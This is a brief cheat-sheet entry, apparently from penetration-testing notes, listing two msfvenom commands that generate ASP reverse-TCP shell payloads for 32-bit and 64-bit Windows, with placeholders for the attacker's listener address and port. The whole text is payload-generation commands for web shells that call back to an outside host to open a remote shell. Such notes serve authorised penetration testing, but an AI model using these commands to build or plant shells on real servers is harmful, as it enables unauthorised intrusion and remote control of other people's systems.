# ASP

1. x86 (32-bit) Payloads

`$ msfvenom -p windows/shell/reverse_tcp lhost=<IP> lport=<PORT> -f asp -o shell-x86.asp`

2. x86_64 (64-bit) Payloads

`$ msfvenom -p windows/x64/shell/reverse_tcp lhost=<IP> lport=<PORT> -f asp -o shell-x64.asp`